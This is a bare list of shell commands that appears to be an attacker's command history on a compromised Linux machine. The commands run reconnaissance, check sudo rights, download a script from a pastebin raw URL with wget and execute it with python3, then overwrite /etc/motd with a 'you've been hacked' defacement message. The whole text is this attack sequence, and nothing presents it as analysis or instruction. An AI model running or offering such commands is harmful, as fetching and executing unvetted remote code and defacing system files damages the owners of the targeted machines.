whoami
ls -la
pwd
lsb_release -a
sudo -l
wget https://pastebin.com/raw/nZWENhVq
python3 nZWENhVq shc/
echo -n "Haha you've been hacked!" > /etc/motd
